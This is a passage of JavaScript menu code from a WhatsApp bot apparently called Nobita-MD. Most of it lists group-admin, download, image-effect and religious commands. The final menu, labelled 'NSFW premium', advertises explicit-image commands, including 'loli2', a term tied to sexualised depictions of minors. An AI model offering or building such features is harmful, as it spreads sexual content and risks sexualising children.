│ ‣ ${prefix}ramaljodohbali
│ ‣ ${prefix}suamiistri
│ ‣ ${prefix}ramalcinta
│ ‣ ${prefix}cocoknama
│ ‣ ${prefix}pasangan
│ ‣ ${prefix}jadiannikah
│ ‣ ${prefix}sifatusaha
│ ‣ ${prefix}rezeki
│ ‣ ${prefix}pekerjaan
│ ‣ ${prefix}ramalnasib
│ ‣ ${prefix}penyakit
│ ‣ ${prefix}tarot
│ ‣ ${prefix}fengshui
│ ‣ ${prefix}haribaik
│ ‣ ${prefix}harisangar
│ ‣ ${prefix}harisial
│ ‣ ${prefix}nagahari
│ ‣ ${prefix}arahrezeki
│ ‣ ${prefix}peruntungan
│ ‣ ${prefix}weton
│ ‣ ${prefix}karakter
│ ‣ ${prefix}keberuntungan
│ ‣ ${prefix}memancing
│ ‣ ${prefix}masasubur
│ ‣ ${prefix}zodiak
│ ‣ ${prefix}shio
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu5.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break

case 'groupmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *G R O U P* 」
│ ‣ ${prefix}kick
│ ‣ ${prefix}add
│ ‣ ${prefix}culik
│ ‣ ${prefix}promote
│ ‣ ${prefix}demote
│ ‣ ${prefix}setname
│ ‣ ${prefix}setdesc
│ ‣ ${prefix}setppgc
│ ‣ ${prefix}tagall
│ ‣ ${prefix}hidetag
│ ‣ ${prefix}totag
│ ‣ ${prefix}antilink
│ ‣ ${prefix}antilinkv2
│ ‣ ${prefix}antilinkyt
│ ‣ ${prefix}antilinktt
│ ‣ ${prefix}antipanel
│ ‣ ${prefix}mutegc
│ ‣ ${prefix}ephemeral
│ ‣ ${prefix}group
│ ‣ ${prefix}editinfo
│ ‣ ${prefix}linkgc
│ ‣ ${prefix}revoke
│ ‣ ${prefix}liston
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu6.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'datamenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *D A T A B A S E* 」
│ ‣ ${prefix}setcmd [reply sticker/pesan]
│ ‣ ${prefix}listcmd
│ ‣ ${prefix}delcmd [reply sticker/pesan]
│ ‣ ${prefix}lockcmd
│ ‣ ${prefix}addmsg
│ ‣ ${prefix}listmsg
│ ‣ ${prefix}getmsg
│ ‣ ${prefix}delmsg
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu7.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'ramdonmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *R A M D O N* 」
│ ‣ ${prefix}pokemon
│ ‣ ${prefix}rize
│ ‣ ${prefix}sagiri
│ ‣ ${prefix}aesthetic
│ ‣ ${prefix}anjing
│ ‣ ${prefix}blankpink
│ ‣ ${prefix}boneka
│ ‣ ${prefix}hekel
│ ‣ ${prefix}justina
│ ‣ ${prefix}kpop
│ ‣ ${prefix}kucing
│ ‣ ${prefix}mobil
│ ‣ ${prefix}motor
│ ‣ ${prefix}pubg
│ ‣ ${prefix}rose
│ ‣ ${prefix}ryujin
│ ‣ ${prefix}wallhp
│ ‣ ${prefix}cyberspace
│ ‣ ${prefix}mountain
│ ‣ ${prefix}programming
│ ‣ ${prefix}technology 
│ ‣ ${prefix}couple
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu8.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'asupanmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *A S U P A N*」
│ ‣ ${prefix}cecan
│ ‣ ${prefix}china
│ ‣ ${prefix}cogan
│ ‣ ${prefix}indonesia
│ ‣ ${prefix}japan
│ ‣ ${prefix}korea
│ ‣ ${prefix}malaysia
│ ‣ ${prefix}thailand
│ ‣ ${prefix}vietnam
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu9.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'toolsmenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *T O O L S* 」
│ ‣ ${prefix}style
│ ‣ ${prefix}delete
│ ‣ ${prefix}quoted
│ ‣ ${prefix}ebinary
│ ‣ ${prefix}dbinary
│ ‣ ${prefix}wikimedia
│ ‣ ${prefix}bass
│ ‣ ${prefix}blown
│ ‣ ${prefix}deep
│ ‣ ${prefix}earrape
│ ‣ ${prefix}fast
│ ‣ ${prefix}fat
│ ‣ ${prefix}nightcore
│ ‣ ${prefix}reverse
│ ‣ ${prefix}robot
│ ‣ ${prefix}slow
│ ‣ ${prefix}tupai
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu10.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'creatormenu': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *C R E A T O R  I M A G E* 」
│ ‣ ${prefix}tololsertifikat *<text>*
│ ‣ ${prefix}bucinsertifikat *<text>*
│ ‣ ${prefix}pacarsertifikat *<text>*
│ ‣ ${prefix}ttp *<text>*
│ ‣ ${prefix}attp *<text>*
│ ‣ ${prefix}attp2 *<text>*
│ ‣ ${prefix}qcimg *<text>*
│ ‣ ${prefix}qc *<text>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu11.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'islammenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *I S L A M* 」
│ ‣ ${prefix}asmaulhusna
│ ‣ ${prefix}alquranaudio
│ ‣ ${prefix}alquran
│ ‣ ${prefix}jadwalsolat
│ ‣ ${prefix}kisahnabi
│ ‣ ${prefix}listsurah
│ ‣ ${prefix}iqro
│ ‣ ${prefix}juzamma
│ ‣ ${prefix}hadist
│ ‣ ${prefix}tasfirsurah
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu12.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'downmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *D O W N L O A D* 」
│ ‣ ${prefix}ytplay
│ ‣ ${prefix}ytmp3
│ ‣ ${prefix}ytmp4
│ ‣ ${prefix}igdl
│ ‣ ${prefix}igdl2
│ ‣ ${prefix}tiktok
│ ‣ ${prefix}tiktokaudio
│ ‣ ${prefix}twtdl
│ ‣ ${prefix}fbdl
│ ‣ ${prefix}mediafire
│ ‣ ${prefix}gitclone
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu13.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'ephoto1': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *E P H O T O _1_* 」
│ ‣ ${prefix}wetglass *<text>*
│ ‣ ${prefix}multicolor3d *<text>*
│ ‣ ${prefix}watercolor *<text>*
│ ‣ ${prefix}luxurygold *<text>*
│ ‣ ${prefix}galaxywallpaper *<text>*
│ ‣ ${prefix}lighttext *<text>*
│ ‣ ${prefix}beautifulflower *<text>*
│ ‣ ${prefix}puppycute *<text>*
│ ‣ ${prefix}royaltext *<text>*
│ ‣ ${prefix}heartshaped *<text>*
│ ‣ ${prefix}birthdaycake *<text>*
│ ‣ ${prefix}galaxystyle *<text>*
│ ‣ ${prefix}hologram3d *<text>*
│ ‣ ${prefix}greenneon *<text>*
│ ‣ ${prefix}glossychrome *<text>*
│ ‣ ${prefix}greenbush *<text>*
│ ‣ ${prefix}metallogo *<text>*
│ ‣ ${prefix}noeltext *<text>*
│ ‣ ${prefix}glittergold *<text>*
│ ‣ ${prefix}textcake *<text>*
│ ‣ ${prefix}starsnight *<text>*
│ ‣ ${prefix}wooden3d *<text>*
│ ‣ ${prefix}textbyname *<text>*
│ ‣ ${prefix}writegalacy *<text>*
│ ‣ ${prefix}galaxybat *<text>*
│ ‣ ${prefix}snow3d *<text>*
│ ‣ ${prefix}birthdayday *<text>*
│ ‣ ${prefix}goldplaybutton *<text>*
│ ‣ ${prefix}silverplaybutton *<text>*
│ ‣ ${prefix}freefire *<text>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu14.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'photooxy1': {
let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *P H O T O  O X Y _1_* 」
│ ‣ ${prefix}shadow *<text>*
│ ‣ ${prefix}cup *<text>*
│ ‣ ${prefix}cup1 *<text>*
│ ‣ ${prefix}romance *<text>*
│ ‣ ${prefix}smoke *<text>*
│ ‣ ${prefix}burnpaper *<text>*
│ ‣ ${prefix}lovemessage *<text>*
│ ‣ ${prefix}undergrass *<text>*
│ ‣ ${prefix}love *<text>*
│ ‣ ${prefix}coffe *<text>*
│ ‣ ${prefix}woodheart *<text>*
│ ‣ ${prefix}woodenboard *<text>*
│ ‣ ${prefix}summer3d *<text>*
│ ‣ ${prefix}wolfmetal *<text>*
│ ‣ ${prefix}nature3d *<text>*
│ ‣ ${prefix}underwater *<text>*
│ ‣ ${prefix}golderrose *<text>*
│ ‣ ${prefix}summernature *<text>*
│ ‣ ${prefix}letterleaves *<text>*
│ ‣ ${prefix}glowingneon *<text>*
│ ‣ ${prefix}fallleaves *<text>*
│ ‣ ${prefix}flamming *<text>*
│ ‣ ${prefix}harrypotter *<text>*
│ ‣ ${prefix}carvedwood *<text>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu15.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'textpro1': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *T E X T  P R O _1_* 」
│ ‣ ${prefix}blackpink *<text>*
│ ‣ ${prefix}neon *<text>*
│ ‣ ${prefix}greenneon *<text>*
│ ‣ ${prefix}advanceglow *<text>*
│ ‣ ${prefix}futureneon *<text>*
│ ‣ ${prefix}sandwriting *<text>*
│ ‣ ${prefix}sandsummer *<text>*
│ ‣ ${prefix}sandengraved *<text>*
│ ‣ ${prefix}metaldark *<text>*
│ ‣ ${prefix}neonlight *<text>*
│ ‣ ${prefix}holographic *<text>*
│ ‣ ${prefix}text1917 *<text>*
│ ‣ ${prefix}minion *<text>*
│ ‣ ${prefix}deluxesilver *<text>*
│ ‣ ${prefix}newyearcard *<text>*
│ ‣ ${prefix}bloodfrosted *<text>*
│ ‣ ${prefix}halloween *<text>*
│ ‣ ${prefix}jokerlogo *<text>*
│ ‣ ${prefix}fireworksparkle *<text>*
│ ‣ ${prefix}natureleaves *<text>*
│ ‣ ${prefix}bokeh *<text>*
│ ‣ ${prefix}toxic *<text>*
│ ‣ ${prefix}strawberry *<text>*
│ ‣ ${prefix}box3d *<text>*
│ ‣ ${prefix}roadwarning *<text>*
│ ‣ ${prefix}breakwall *<text>*
│ ‣ ${prefix}icecold *<text>*
│ ‣ ${prefix}luxury *<text>*
│ ‣ ${prefix}cloud *<text>*
│ ‣ ${prefix}summersand *<text>*
│ ‣ ${prefix}horrorblood *<text>*
│ ‣ ${prefix}thunder *<text>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu5.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'textpro2': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *T E X T  P R O _2_* 」
│ ‣ ${prefix}pornhub *<text>*
│ ‣ ${prefix}glitch *<text>*
│ ‣ ${prefix}avenger *<text>*
│ ‣ ${prefix}space *<text>*
│ ‣ ${prefix}ninjalogo *<text>*
│ ‣ ${prefix}marvelstudio *<text>*
│ ‣ ${prefix}lionlogo *<text>*
│ ‣ ${prefix}wolflogo *<text>*
│ ‣ ${prefix}steel3d *<text>*
│ ‣ ${prefix}wallgravity *<text>*
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
        thumbnailUrl: "https://telegra.ph/file/b785a8ced63a0e5c766f8.jpg",
        sourceUrl: "https://chat.whatsapp.com/D8idyjswgHtHeABcXPsUyk",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
   conn.sendMessage(m.chat, { audio: fs.readFileSync('./mp3/menu3.mp3'), mimetype: 'audio/mp4', ptt: true, fileLength: 88738})
}
break
case 'nsfwmenu': {
let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

▧ 「 *N S F W  P R E M I U M* 」
│ ‣ ${prefix}ahegao
│ ‣ ${prefix}cum
│ ‣ ${prefix}panties
│ ‣ ${prefix}bdsm
│ ‣ ${prefix}tits
│ ‣ ${prefix}milf
│ ‣ ${prefix}yuri
│ ‣ ${prefix}lewd
│ ‣ ${prefix}ero
│ ‣ ${prefix}armpits
│ ‣ ${prefix}feets
│ ‣ ${prefix}ecchi
│ ‣ ${prefix}neko2
│ ‣ ${prefix}loli2
│ ‣ ${prefix}pussy
│ ‣ ${prefix}cum_jpg
│ ‣ ${prefix}blowjob
│ ‣ ${prefix}lewdk
└──···`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "ɴᴏʙɪᴛᴀ-ᴍᴅ",
